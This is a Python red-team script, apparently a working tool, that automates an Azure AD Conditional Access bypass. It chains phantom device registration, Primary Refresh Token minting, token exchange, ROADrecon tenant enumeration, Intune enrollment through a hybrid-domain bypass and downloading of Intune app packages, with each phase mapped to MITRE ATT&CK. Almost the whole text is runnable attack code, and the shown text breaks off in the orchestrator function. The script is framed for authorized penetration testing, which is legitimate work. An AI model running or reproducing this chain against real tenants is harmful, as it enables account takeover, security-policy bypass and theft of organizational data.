#!/usr/bin/env python3
"""
phantom_join.py — Azure AD Conditional Access Device Identity Bypass

Automates the attack chain documented by Cyderes Howler Cell:
"One Password, No Device, Full Tenant: Dismantling Azure AD Conditional
Access Through Device Identity Abuse"

Phases:
  1. Initial auth probe (confirms CA block)
  2. Device code flow to Device Registration Service
  3. Phantom device registration (Azure AD Join)
  4. Primary Refresh Token minting
  5. PRT-to-Graph token exchange (CA bypass)
  6. Full tenant enumeration via ROADrecon
  7. CA policy analysis
  8. Intune enrollment (hybrid domain bypass)
  9. Compliance achievement & app exfiltration

Prerequisites:
  - ROADtools installed: pip install roadtools roadrecon roadtx
  - Python 3.10+
  - Valid target credentials (authorized engagement only)

Usage:
    # Full chain — interactive device code flow
    python phantom_join.py --username user@target.com --password 'P@ss' --domain target.com

    # Skip to specific phase (e.g., already have device cert)
    python phantom_join.py --username user@target.com --password 'P@ss' --domain target.com \\
        --start-phase 4 --device-name YOURPC-PC01

    # Intune enrollment with hybrid bypass
    python phantom_join.py --username user@target.com --password 'P@ss' --domain target.com \\
        --intune --intune-host hmk.target.manage.microsoft.com:443 --hybrid-domain corp.target.com

    # Dry run — show commands without executing
    python phantom_join.py --username user@target.com --password 'P@ss' --domain target.com --dry-run

Author: Red Team Tooling
References:
  - https://www.cyderes.com/howler-cell/azure-ad-conditional-access-device-identity-abuse
  - https://github.com/dirkjanm/ROADtools
  - MITRE ATT&CK: T1098.005, T1078.004, T1550.001, T1556.007, T1087.004
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Microsoft Authentication Broker client ID (used by Storm-2372 and in the article)
AUTH_BROKER_CLIENT_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e"

# DRS resource URI
DRS_RESOURCE = "urn:ms-drs:enterpriseregistration.windows.net"

# Intune enrollment resource
INTUNE_RESOURCE = "https://enrollment.manage.microsoft.com/"

# AAD Graph (legacy but still used by roadtx for PRT operations)
AAD_GRAPH_RESOURCE = "https://graph.windows.net"

# MS Graph
MS_GRAPH_RESOURCE = "https://graph.microsoft.com"

BANNER = r"""
  ___  _               _                     _       _
 | _ \| |_  __ _ _ __ | |_ ___ _ __    _ ___(_)_ __ | |_
 |  _/| ' \/ _` | '  \|  _/ _ \ '  \  | / _ \ | '  \|  _|
 |_|  |_||_\__,_|_||_| \__\___/_|_|_|  | \___/_|_||_|\__|
                                       _/ |
  Azure AD CA Bypass — Device Identity |__/  Abuse Chain
  Based on Cyderes Howler Cell Research

  ⚠  AUTHORIZED ENGAGEMENTS ONLY
"""

PHASE_NAMES = {
    1: "Initial Auth Probe",
    2: "Device Code Flow → DRS Token",
    3: "Phantom Device Registration",
    4: "Primary Refresh Token Minting",
    5: "PRT → Graph Token Exchange (CA Bypass)",
    6: "Tenant Enumeration (ROADrecon)",
    7: "Conditional Access Policy Analysis",
    8: "Intune Enrollment (Hybrid Bypass)",
    9: "Compliance Check & App Exfiltration",
}

MITRE_MAPPING = {
    1: ["T1078.004 — Valid Accounts: Cloud Accounts"],
    2: ["T1078.004 — Valid Accounts: Cloud Accounts", "T1621 — MFA Request Generation"],
    3: ["T1098.005 — Account Manipulation: Device Registration",
        "T1556.009 — Modify Authentication Process: Conditional Access Policies"],
    4: ["T1550.001 — Use Alternate Authentication Material: Application Access Token"],
    5: ["T1078.004 — Valid Accounts: Cloud Accounts"],
    6: ["T1087.004 — Account Discovery: Cloud Account", "T1526 — Cloud Service Discovery"],
    7: ["T1556.009 — Modify Authentication Process: Conditional Access Policies",
        "T1078.002 — Valid Accounts: Domain Accounts",
        "T1098.001 — Account Manipulation: Additional Cloud Credentials"],
    8: ["T1556.007 — Modify Authentication Process: Hybrid Identity"],
    9: ["T1530 — Data from Cloud Storage"],
}


# ---------------------------------------------------------------------------
# Logging & Utilities
# ---------------------------------------------------------------------------

class Logger:
    """Structured operation logger with file + console output."""

    def __init__(self, log_dir: Path):
        self.log_dir = log_dir
        self.log_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"phantom_join_{ts}.log"
        self.findings_file = self.log_dir / f"findings_{ts}.json"
        self.findings: list[dict] = []
        self._write(f"phantom_join started at {datetime.now(timezone.utc).isoformat()}\n")

    def phase(self, num: int, name: str):
        mitre = MITRE_MAPPING.get(num, [])
        header = f"\n{'='*70}\n  PHASE {num}: {name}\n{'='*70}"
        if mitre:
            header += f"\n  MITRE ATT&CK: {' | '.join(mitre)}"
        print(header)
        self._write(header + "\n")

    def info(self, msg: str):
        line = f"  [*] {msg}"
        print(line)
        self._write(line + "\n")

    def success(self, msg: str):
        line = f"  [+] {msg}"
        print(f"\033[92m{line}\033[0m")
        self._write(line + "\n")

    def warning(self, msg: str):
        line = f"  [!] {msg}"
        print(f"\033[93m{line}\033[0m")
        self._write(line + "\n")

    def error(self, msg: str):
        line = f"  [-] {msg}"
        print(f"\033[91m{line}\033[0m")
        self._write(line + "\n")

    def cmd(self, command: str):
        line = f"  >>> {command}"
        print(f"\033[90m{line}\033[0m")
        self._write(line + "\n")

    def finding(self, severity: str, title: str, detail: str, phase: int,
                mitre: Optional[str] = None):
        f = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "severity": severity,
            "phase": phase,
            "title": title,
            "detail": detail,
            "mitre": mitre,
        }
        self.findings.append(f)
        marker = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "INFO": "⚪"}.get(severity, "⚪")
        print(f"  {marker} [{severity}] {title}")
        self._write(f"  FINDING [{severity}] {title}: {detail}\n")

    def save_findings(self):
        with open(self.findings_file, "w") as f:
            json.dump(self.findings, f, indent=2)
        self.info(f"Findings saved to {self.findings_file}")

    def _write(self, text: str):
        with open(self.log_file, "a") as f:
            f.write(text)


def run_cmd(cmd: list[str], log: Logger, dry_run: bool = False,
            env: Optional[dict] = None, capture: bool = True,
            timeout: int = 300, stream: bool = False) -> tuple[int, str, str]:
    """Execute a command with logging. Returns (returncode, stdout, stderr).

    `stream=True` forwards each line of output to `log.info()` as it's
    produced instead of only after the process exits. Required for any
    command whose stdout is itself the thing an operator needs to see and
    act on *while it's running* (e.g. `roadtx gettokens --device-code`
    prints a verification URL + code that's only useful within the
    command's own timeout window). The non-streaming path uses
    `subprocess.run(capture_output=True)`, which buffers everything and,
    on `TimeoutExpired`, discards the partial output entirely — fine for
    commands where only the final result matters, but it silently
    swallowed the device-code prompt with no way to recover it, blocking
    that phase for every caller (confirmed live, not just reasoned about)."""
    cmd_str = " ".join(cmd)
    log.cmd(cmd_str)

    if dry_run:
        log.info("[DRY RUN] Command not executed")
        return 0, "[dry run]", ""

    merged_env = {**os.environ, **(env or {})}

    if stream:
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1, env=merged_env,
            )
        except FileNotFoundError:
            log.error(f"Command not found: {cmd[0]}")
            return -1, "", "not found"
        lines: list[str] = []
        start = time.monotonic()
        timed_out = False
        try:
            for line in proc.stdout:
                log.info(line.rstrip("\n"))
                lines.append(line)
                if time.monotonic() - start > timeout:
                    timed_out = True
                    break
            if not timed_out:
                proc.wait(timeout=max(0.0, timeout - (time.monotonic() - start)))
        except subprocess.TimeoutExpired:
            timed_out = True
        if timed_out:
            proc.kill()
            proc.wait()
            log.error(f"Command timed out after {timeout}s")
            return -1, "".join(lines), "timeout"
        return proc.returncode, "".join(lines), ""

    try:
        result = subprocess.run(
            cmd, capture_output=capture, text=True,
            env=merged_env, timeout=timeout,
        )
        if result.stdout and capture:
            for line in result.stdout.strip().split("\n"):
                log.info(f"  {line}")
        if result.stderr and capture:
            for line in result.stderr.strip().split("\n"):
                if "error" in line.lower() or "fail" in line.lower():
                    log.error(f"  {line}")
                else:
                    log.info(f"  {line}")
        return result.returncode, result.stdout or "", result.stderr or ""
    except subprocess.TimeoutExpired:
        log.error(f"Command timed out after {timeout}s")
        return -1, "", "timeout"
    except FileNotFoundError:
        log.error(f"Command not found: {cmd[0]}")
        return -1, "", "not found"


def check_prerequisites(log: Logger) -> bool:
    """Verify roadtx, roadrecon, and Python deps are available."""
    tools = ["roadtx", "roadrecon"]
    all_ok = True
    for tool in tools:
        if shutil.which(tool):
            log.success(f"{tool} found")
        else:
            log.error(f"{tool} not found — install with: pip install roadtools roadtx")
            all_ok = False
    return all_ok


# ---------------------------------------------------------------------------
# Attack Chain State
# ---------------------------------------------------------------------------

@dataclass
class ChainState:
    """Tracks artifacts produced across phases."""
    work_dir: Path
    username: str
    password: str
    domain: str
    device_name: str
    # Registered device OS type — Windows (roadtx default), macOS, iOS, or
    # Android. Registering as a non-Windows platform probes platform-scoped
    # Conditional Access / Intune compliance that a Windows join wouldn't hit.
    device_type: str = "Windows"
    os_version: str = ""

    # Phase 2 outputs
    drs_token_file: str = ".roadtools_auth"
    has_drs_token: bool = False

    # Phase 3 outputs
    device_cert: str = ""
    device_key: str = ""
    device_id: str = ""
    has_device: bool = False

    # Phase 4 outputs
    prt_file: str = "roadtx.prt"
    has_prt: bool = False

    # Phase 5 outputs
    device_token_file: str = ".roadtools_auth_device"
    has_device_token: bool = False

    # Phase 6 outputs
    roadrecon_db: str = "roadrecon.db"
    has_enumeration: bool = False

    # Phase 8 outputs
    intune_device_file: str = ""
    has_intune: bool = False

    # Intune config
    intune_host: str = ""
    hybrid_domain: str = ""

    def __post_init__(self):
        # `roadtx device -a join` lowercases the device name for the cert/key
        # filenames it writes regardless of the case passed to `-n` — confirmed
        # live: `-n YOURPC-LQJ2S` produced `yourpc-lqj2s.pem`/`.key` on disk.
        # Phase 3's own success check (cert_path.exists() and key_path.exists())
        # was comparing against the original-case name and always missed on a
        # case-sensitive filesystem, reporting "Device registration failed"
        # even when roadtx had just printed a real Device ID and saved the
        # cert. Lowercase here so the state matches what's actually on disk.
        self.device_name = self.device_name.lower()
        self.device_cert = f"{self.device_name}.pem"
        self.device_key = f"{self.device_name}.key"
        self.intune_device_file = f"{self.device_name}.rtdevice"


# ---------------------------------------------------------------------------
# Phase Implementations
# ---------------------------------------------------------------------------

def phase_1_initial_probe(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Attempt direct auth to confirm CA block (AADSTS53003)."""
    log.phase(1, PHASE_NAMES[1])
    log.info(f"Probing direct auth for {state.username}")

    rc, stdout, stderr = run_cmd([
        "roadtx", "gettokens",
        "-u", state.username,
        "-p", state.password,
        "-r", AAD_GRAPH_RESOURCE,
    ], log, dry_run)

    combined = stdout + stderr
    if "AADSTS53003" in combined:
        log.success("Confirmed: Conditional Access blocked direct authentication (AADSTS53003)")
        log.finding("INFO", "CA Block Confirmed",
                     "Direct ROPC authentication blocked by Conditional Access as expected",
                     phase=1, mitre="T1078.004")
        return True
    elif "AADSTS50126" in combined:
        log.error("Invalid credentials — password is wrong")
        return False
    elif "AADSTS50034" in combined:
        log.error("User account not found in tenant")
        return False
    elif "AADSTS50053" in combined:
        log.error("Account locked out — too many failed attempts")
        return False
    elif rc == 0:
        log.warning("Direct auth SUCCEEDED — CA did not block. No bypass needed.")
        log.warning("Tokens saved. You can proceed directly to enumeration.")
        log.finding("HIGH", "No CA Enforcement on ROPC",
                     "Direct ROPC grant succeeded without device compliance or MFA challenge",
                     phase=1, mitre="T1078.004")
        return True
    else:
        log.warning(f"Unexpected auth response. Review output above.")
        # Continue anyway — user may want to try device code flow
        return True


def phase_2_drs_token(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Obtain DRS token via device code flow."""
    log.phase(2, PHASE_NAMES[2])
    log.info("Initiating device code flow targeting Device Registration Service")
    log.info(f"Resource: {DRS_RESOURCE}")
    log.info(f"Client ID: {AUTH_BROKER_CLIENT_ID} (Microsoft Authentication Broker)")
    log.info("")
    log.warning("⚡ INTERACTIVE — complete the device code flow in your browser")
    log.info("")

    rc, stdout, stderr = run_cmd([
        "roadtx", "gettokens",
        "--device-code",
        "-r", DRS_RESOURCE,
        "-c", AUTH_BROKER_CLIENT_ID,
    ], log, dry_run, timeout=120, stream=True)

    if dry_run:
        state.has_drs_token = True
        return True

    # Check for token file
    token_path = state.work_dir / state.drs_token_file
    if token_path.exists() or rc == 0:
        state.has_drs_token = True
        log.success("DRS token obtained successfully")

        # Inspect the token
        log.info("Inspecting token claims...")
        rc2, desc_out, _ = run_cmd(["roadtx", "describe"], log, dry_run)
        if "mfa" in desc_out.lower():
            log.success("Token includes MFA claim — device registration will proceed")
        if "pwd" in desc_out.lower():
            log.info("Token includes password authentication method")

        log.finding("HIGH", "DRS Endpoint Accessible via Device Code Flow",
                     "Device Registration Service token obtained through device code flow, "
                     "bypassing Conditional Access policies that blocked direct ROPC auth. "
                     "CA policy governing device code flow is either report-only or absent.",
                     phase=2, mitre="T1078.004")
        return True
    else:
        log.error("Failed to obtain DRS token")
        log.info("Possible causes: device code flow blocked by CA, user cancelled, timeout")
        return False


def phase_3_register_device(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Register a phantom device in Azure AD."""
    log.phase(3, PHASE_NAMES[3])
    log.info(f"Registering phantom device: {state.device_name} "
             f"· type={state.device_type}"
             + (f" {state.os_version}" if state.os_version else ""))

    cmd = ["roadtx", "device", "-a", "join", "-n", state.device_name]
    # roadtx defaults to a Windows device; only pass --device-type when the
    # operator picked something else so default runs are byte-for-byte unchanged.
    if state.device_type and state.device_type.lower() != "windows":
        cmd += ["--device-type", state.device_type]
    if state.os_version:
        cmd += ["--os-version", state.os_version]
    rc, stdout, stderr = run_cmd(cmd, log, dry_run)

    combined = stdout + stderr

    if dry_run:
        state.has_device = True
        return True

    # Check for device cert and key
    cert_path = state.work_dir / state.device_cert
    key_path = state.work_dir / state.device_key

    if cert_path.exists() and key_path.exists():
        state.has_device = True
        log.success(f"Device registered: {state.device_name}")
        log.success(f"Certificate: {state.device_cert}")
        log.success(f"Private key: {state.device_key}")

        # Extract device ID from output if available
        device_id_match = re.search(r"[Dd]evice\s*[Ii][Dd]:\s*([a-f0-9\-]{36})", combined)
        if device_id_match:
            state.device_id = device_id_match.group(1)
            log.success(f"Device ID: {state.device_id}")

        log.finding("CRITICAL", "Phantom Device Registered",
                     f"Successfully registered phantom device '{state.device_name}' "
                     f"(OS type: {state.device_type}) "
                     f"in Azure AD without TPM, hardware verification, or admin approval. "
                     f"DRS accepted the join request using only a valid token. "
                     f"Device ID: {state.device_id or 'see certificate'}",
                     phase=3, mitre="T1098.005")
        return True
    elif "already exists" in combined.lower():
        log.warning("Device name already registered. Attempting to use existing cert/key...")
        if cert_path.exists() and key_path.exists():
            state.has_device = True
            return True
        log.error("Cert/key files not found. Use a different --device-name")
        return False
    else:
        log.error("Device registration failed")
        log.info("Possible causes: DRS token expired, MFA not in token, CA blocking registration")
        return False


def phase_4_mint_prt(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Mint a Primary Refresh Token using the phantom device certificate."""
    log.phase(4, PHASE_NAMES[4])
    log.info("Requesting Primary Refresh Token with phantom device certificate")

    rc, stdout, stderr = run_cmd([
        "roadtx", "prt",
        "-a", "request",
        "-c", state.device_cert,
        "-k", state.device_key,
        "-u", state.username,
        "-p", state.password,
    ], log, dry_run)

    combined = stdout + stderr

    if dry_run:
        state.has_prt = True
        return True

    prt_path = state.work_dir / state.prt_file
    if prt_path.exists() or "prt" in combined.lower() and rc == 0:
        state.has_prt = True
        log.success("Primary Refresh Token obtained")
        log.success(f"PRT saved to: {state.prt_file}")
        log.finding("CRITICAL", "PRT Minted from Phantom Device",
                     "Primary Refresh Token minted using phantom device certificate. "
                     "This PRT carries device claims (amr: rsa) identical to what a "
                     "legitimate TPM-backed device would produce. PRT is stored in "
                     "plaintext — no TPM protection.",
                     phase=4, mitre="T1550.001")
        return True
    else:
        log.error("PRT request failed")
        if "AADSTS" in combined:
            error_match = re.search(r"(AADSTS\d+)", combined)
            if error_match:
                log.error(f"Azure AD error: {error_match.group(1)}")
        return False


def phase_5_prt_exchange(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Exchange PRT for resource tokens — the actual CA bypass."""
    log.phase(5, PHASE_NAMES[5])
    log.info("Exchanging PRT for AAD Graph token with device claims")

    # Exchange for AAD Graph
    # `--tokenfile` (not `--tokens-file`) — confirmed live against the
    # installed roadtx build's own --help; the wrong flag name made every
    # phase 5 run fail with "unrecognized arguments" before roadtx ever
    # got to the actual PRT exchange.
    rc, stdout, stderr = run_cmd([
        "roadtx", "prtauth",
        "-f", state.prt_file,
        "-r", AAD_GRAPH_RESOURCE,
        "--tokenfile", state.device_token_file,
    ], log, dry_run)

    combined = stdout + stderr

    if dry_run:
        state.has_device_token = True
        return True

    token_path = state.work_dir / state.device_token_file
    if token_path.exists() or rc == 0:
        state.has_device_token = True
        log.success("PRT exchanged for AAD Graph token with device claims")

        # Describe the new token to confirm device claims
        log.info("Inspecting device-authenticated token claims...")
        rc2, desc_out, _ = run_cmd([
            "roadtx", "describe",
            "--tokenfile", state.device_token_file,
        ], log, dry_run)

        if "rsa" in desc_out.lower():
            log.success("Token contains amr: rsa — device certificate authentication confirmed")
        if "deviceid" in desc_out.lower():
            log.success("Token contains deviceid claim — CA will evaluate as joined device")

        log.finding("CRITICAL", "Conditional Access Bypassed via Device Claims",
                     "PRT successfully exchanged for AAD Graph token carrying device claims "
                     "(amr: [pwd, rsa], deviceid). The same credentials that triggered "
                     "AADSTS53003 via direct auth now produce a fully valid token. "
                     "All CA policies requiring joined/compliant device are satisfied.",
                     phase=5, mitre="T1078.004")

        # Also try MS Graph
        log.info("Also exchanging PRT for MS Graph token...")
        run_cmd([
            "roadtx", "prtauth",
            "-f", state.prt_file,
            "-r", MS_GRAPH_RESOURCE,
            "--tokenfile", ".roadtools_auth_msgraph",
        ], log, dry_run)

        return True
    else:
        m = re.search(r"(AADSTS\d+)", combined)
        code = m.group(1) if m else ""
        if code == "AADSTS50076" or "interaction_required" in combined.lower():
            log.error("PRT exchange blocked by Conditional Access — the resource "
                      "requires MFA and this PRT carries no MFA claim.")
            log.warning(
                "The PRT was minted from username+password (Phase 4), so it "
                "carries amr:[pwd,rsa] but not mfa. To satisfy an MFA-strength "
                "CA policy, enrich the PRT interactively — "
                f"`roadtx prtenrich -f {state.prt_file}` — then re-run from "
                "phase 5. This block is the CA policy working as intended: the "
                "bypass only completes where the device-code / PRT grant is "
                "NOT covered by MFA.")
        elif code:
            log.error(f"PRT exchange failed: {code}")
        else:
            log.error("PRT exchange failed")
        return False


def phase_6_enumerate(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Full tenant enumeration via ROADrecon."""
    log.phase(6, PHASE_NAMES[6])
    log.info("Running full tenant enumeration with device-authenticated token")

    # Phase 5 must have produced the device-authenticated token; without it
    # `roadrecon gather` just raises FileNotFoundError. Under --force the run
    # reaches here even when Phase 5 was CA-blocked, so skip cleanly instead
    # of dumping a traceback.
    if not dry_run and not (state.work_dir / state.device_token_file).exists():
        log.warning(
            f"Skipping enumeration — {state.device_token_file} not found "
            "(Phase 5 produced no device token; it was likely CA-blocked). "
            f"Enrich the PRT (roadtx prtenrich -f {state.prt_file}) and re-run "
            "from phase 5.")
        return False

    rc, stdout, stderr = run_cmd([
        "roadrecon", "gather",
        "--tokenfile", state.device_token_file,
        "-d", state.roadrecon_db,
    ], log, dry_run, timeout=600)

    if dry_run:
        state.has_enumeration = True
        return True

    db_path = state.work_dir / state.roadrecon_db
    if db_path.exists() or rc == 0:
        state.has_enumeration = True
        log.success(f"Enumeration complete — database: {state.roadrecon_db}")

        # Parse enumeration stats from output
        combined = stdout + stderr
        for entity in ["users", "groups", "devices", "applications", "role"]:
            match = re.search(rf"(\d[\d,]*)\s*{entity}", combined, re.IGNORECASE)
            if match:
                log.success(f"  {entity.capitalize()}: {match.group(1)}")

        log.finding("HIGH", "Full Tenant Enumeration",
                     "Complete Azure AD directory enumeration performed using "
                     "device-authenticated token. All users, groups, devices, "
                     "applications, service principals, and role assignments collected.",
                     phase=6, mitre="T1087.004")
        return True
    else:
        log.error("ROADrecon enumeration failed")
        return False


def phase_7_policy_analysis(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Analyze Conditional Access policies from ROADrecon database."""
    log.phase(7, PHASE_NAMES[7])
    log.info("Analyzing Conditional Access policies")

    # Needs the ROADrecon DB from Phase 6; skip cleanly if it's absent rather
    # than letting roadrecon raise "The database file ... was not found".
    if not dry_run and not (state.work_dir / state.roadrecon_db).exists():
        log.warning(
            f"Skipping CA policy analysis — {state.roadrecon_db} not found "
            "(Phase 6 did not complete).")
        return False

    rc, stdout, stderr = run_cmd([
        "roadrecon", "plugin", "policies",
        "-d", state.roadrecon_db,
    ], log, dry_run)

    combined = stdout + stderr

    # Parse policy states
    report_only_count = combined.lower().count("reportonly") + combined.lower().count("report-only")
    enabled_count = combined.lower().count("enabled")

    if report_only_count > 0:
        log.finding("HIGH", f"{report_only_count} Report-Only CA Policies",
                     "Report-only policies are unenforced security controls. "
                     "Review for policies governing device registration (DRS), "
                     "device code flow, and risk-based MFA — these would break "
                     "the attack chain if moved to Enabled.",
                     phase=7, mitre="T1556.009")

    # Also run hybrid identity analysis
    log.info("Checking for synced privileged accounts (on-prem → cloud escalation path)...")
    # This requires querying the roadrecon DB directly
    try:
        import sqlite3
        db_path = state.work_dir / state.roadrecon_db
        if db_path.exists() and not dry_run:
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()

            # Find privileged role assignments for synced accounts
            try:
                cursor.execute("""
                    SELECT DISTINCT u.displayName, u.userPrincipalName,
                           r.displayName as roleName, u.onPremisesSecurityIdentifier
                    FROM Users u
                    JOIN DirectoryRoles_member_User rm ON u.objectId = rm.userId
                    JOIN DirectoryRoles r ON rm.roleId = r.objectId
                    WHERE u.onPremisesSecurityIdentifier IS NOT NULL
                    AND u.onPremisesSecurityIdentifier != ''
                    AND r.displayName IN (
                        'Global Administrator', 'Privileged Role Administrator',
                        'Privileged Authentication Administrator',
                        'Application Administrator', 'Cloud Application Administrator',
                        'Authentication Administrator', 'Security Administrator',
                        'Exchange Administrator', 'SharePoint Administrator',
                        'Intune Administrator', 'User Administrator'
                    )
                """)
                synced_admins = cursor.fetchall()

                if synced_admins:
                    log.finding("CRITICAL",
                                f"{len(synced_admins)} Synced Accounts Hold Privileged Roles",
                                "On-premises AD-synced accounts hold privileged Azure AD roles. "
                                "Compromising on-premises AD provides a direct path to cloud "
                                "tenant takeover. Privileged roles should be cloud-only with PIM.",
                                phase=7, mitre="T1078.002")
                    for name, upn, role, _ in synced_admins:
                        log.info(f"  {upn} → {role} (synced from on-prem)")
            except sqlite3.OperationalError as e:
                log.warning(f"DB query for synced admins failed (schema mismatch): {e}")

            # Check for service principals with dangerous permissions
            try:
                cursor.execute("""
                    SELECT DISTINCT sp.displayName, ar.resourceDisplayName, ar.scope
                    FROM ServicePrincipals sp
                    JOIN AppRoleAssignments ar ON sp.objectId = ar.principalId
                    WHERE ar.scope IN (
                        'Directory.ReadWrite.All', 'User.ReadWrite.All',
                        'RoleManagement.ReadWrite.Directory',
                        'Application.ReadWrite.All'
                    )
                """)
                dangerous_sps = cursor.fetchall()
                if dangerous_sps:
                    log.finding("HIGH",
                                f"{len(dangerous_sps)} Service Principals with Write Permissions",
                                "Service principals with Directory/User write permissions "
                                "can bypass all user-targeted CA policies via client credential flows.",
                                phase=7, mitre="T1098.001")
            except sqlite3.OperationalError:
                pass

            conn.close()
    except ImportError:
        log.warning("sqlite3 not available — skipping DB analysis")

    return True


def phase_8_intune_enroll(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Intune enrollment with hybrid domain bypass."""
    log.phase(8, PHASE_NAMES[8])

    if not state.intune_host:
        log.warning("No Intune host specified (--intune-host). Skipping Intune enrollment.")
        log.info("To discover the Intune service host, use:")
        log.info("  roadtx gettokens --device-code -r https://enrollment.manage.microsoft.com/ "
                 f"-c {AUTH_BROKER_CLIENT_ID}")
        return True

    # First get Intune enrollment token
    log.info("Obtaining Intune enrollment token via device code flow...")
    log.warning("⚡ INTERACTIVE — complete device code flow")
    rc, stdout, stderr = run_cmd([
        "roadtx", "gettokens",
        "--device-code",
        "-r", INTUNE_RESOURCE,
        "-c", AUTH_BROKER_CLIENT_ID,
    ], log, dry_run, timeout=120, stream=True)

    # Enroll with hybrid domain bypass
    log.info(f"Enrolling phantom device with hybrid domain bypass: {state.hybrid_domain}")
    enroll_cmd = [
        "roadtx", "intune", "enroll",
        "-n", state.device_name,
        "--service-host", state.intune_host,
    ]
    if state.hybrid_domain:
        enroll_cmd.extend(["--hybrid-domain", state.hybrid_domain])

    rc, stdout, stderr = run_cmd(enroll_cmd, log, dry_run)

    combined = stdout + stderr
    if dry_run or rc == 0 or "successful" in combined.lower():
        state.has_intune = True
        log.success(f"Intune enrollment successful for {state.device_name}")
        log.finding("CRITICAL", "Intune Enrollment via Hybrid Bypass",
                     f"Phantom device enrolled in Intune using hybrid domain claim "
                     f"({state.hybrid_domain}). Intune did not validate device existence "
                     f"in on-premises AD. Enrollment restrictions bypassed.",
                     phase=8, mitre="T1556.007")
        return True
    else:
        log.error("Intune enrollment failed")
        return False


def phase_9_compliance_and_apps(state: ChainState, log: Logger, dry_run: bool) -> bool:
    """Sync device, check compliance, and attempt app exfiltration."""
    log.phase(9, PHASE_NAMES[9])

    if not state.has_intune:
        log.warning("No Intune enrollment — skipping compliance/app exfiltration")
        return True

    device_file = state.intune_device_file

    # Sync
    log.info("Syncing device with Intune...")
    run_cmd(["roadtx", "intune", "sync", device_file], log, dry_run, timeout=60)

    # Wait for compliance evaluation
    log.info("Waiting 30s for Intune compliance evaluation...")
    if not dry_run:
        time.sleep(30)

    # Check compliance
    log.info("Checking device compliance status...")
    rc, stdout, stderr = run_cmd([
        "roadtx", "intune", "listdevices", device_file,
    ], log, dry_run)

    combined = stdout + stderr
    if "compliant" in combined.lower():
        log.success("Device marked as COMPLIANT by Intune")
        log.finding("CRITICAL", "Compliance Achieved Without Real Device",
                     "Phantom device marked compliant by Intune. No BitLocker, no TPM, "
                     "no Secure Boot, no real AV. Intune treated missing health attestation "
                     "responses as 'not applicable' rather than non-compliant. "
                     "Health Attestation Service (DHA) not required.",
                     phase=9, mitre="T1556.007")
    elif "noncompliant" in combined.lower():
        log.warning("Device marked NON-COMPLIANT — tenant may require health attestation")
    else:
        log.info("Compliance status unclear — review output above")

    # Attempt app download
    log.info("Attempting application exfiltration via IME channel...")
    run_cmd(["roadtx", "intune", "imesync", device_file], log, dry_run, timeout=60)
    rc, stdout, stderr = run_cmd([
        "roadtx", "intune", "installapp", device_file, "--all",
    ], log, dry_run, timeout=300)

    combined = stdout + stderr
    if "download" in combined.lower() or "intunewin" in combined.lower():
        log.success("Application packages downloaded")
        log.finding("HIGH", "Enterprise Application Exfiltration",
                     "Intune application packages downloaded via IME channel. "
                     "Review .intunewin packages for deployment scripts containing "
                     "internal UNC paths, credentials, and infrastructure details.",
                     phase=9, mitre="T1530")

        # Quick scan for interesting content in downloaded apps
        output_dir = state.work_dir / "output" / "userapps"
        if output_dir.exists() and not dry_run:
            for f in output_dir.rglob("*"):
                if f.suffix in (".ps1", ".bat", ".cmd", ".vbs"):
                    try:
                        content = f.read_text(errors="ignore")
                        # Look for UNC paths, credentials, internal hostnames
                        unc_paths = re.findall(r"\\\\[A-Za-z0-9_.\\-]+", content)
                        if unc_paths:
                            log.finding("HIGH", f"Internal UNC Path in {f.name}",
                                         f"Deployment script contains UNC paths: "
                                         f"{', '.join(set(unc_paths[:5]))}",
                                         phase=9, mitre="T1530")
                    except Exception:
                        pass

    return True


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

def run_chain(args: argparse.Namespace):
    """Execute the full attack chain."""
    print(BANNER)

    # Setup working directory
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    # .resolve() BEFORE the chdir below, not after — every later phase does
    # `state.work_dir / <relative filename>` to check for roadtx's output
    # files, and roadtx itself is invoked with no explicit cwd (inherits the
    # process cwd, which becomes work_dir once we chdir into it). Storing
    # work_dir as the pre-chdir *relative* path (e.g. "." joined with the
    # dir name) made every one of those checks resolve one level too deep
    # against the *new* cwd — confirmed live: phase 3 kept reporting "Device
    # registration failed" even right after roadtx printed a real Device ID
    # and saved the cert, because cert_path.exists() was checking
    # work_dir/phantom_join_.../work_dir/phantom_join_.../<name>.pem instead
    # of work_dir/phantom_join_.../<name>.pem.
    work_dir = (Path(args.output_dir) / f"phantom_join_{ts}").resolve()
    work_dir.mkdir(parents=True, exist_ok=True)
    original_dir = os.getcwd()
    os.chdir(work_dir)

    log = Logger(work_dir / "logs")
    log.info(f"Working directory: {work_dir}")
    log.info(f"Target: {args.username}")
    log.info(f"Domain: {args.domain}")
    log.info(f"Device name: {args.device_name}")
    log.info(f"Dry run: {args.dry_run}")
    log.info(f"Start phase: {args.start_phase}")

    if not args.dry_run and not check_prerequisites(log):
        log.error("Missing prerequisites. Install ROADtools first.")
        os.chdir(original_dir)
        sys.exit(1)

    state = ChainState(
        work_dir=work_dir,
        username=args.username,
        password=args.password,
        domain=args.domain,
        device_name=args.device_name,
        device_type=args.device_type,
        os_version=(args.os_version or ""),
    )

    if args.intune_host:
        state.intune_host = args.intune_host
    if args.hybrid_domain:
        state.hybrid_domain = args.hybrid_domain

    # Phase execution with skip support
    phases = [
        (1, phase_1_initial_probe),
        (2, phase_2_drs_token),
        (3, phase_3_register_device),
        (4, phase_4_mint_prt),
        (5, phase_5_prt_exchange),
        (6, phase_6_enumerate),
        (7, phase_7_policy_analysis),
    ]

    if args.intune:
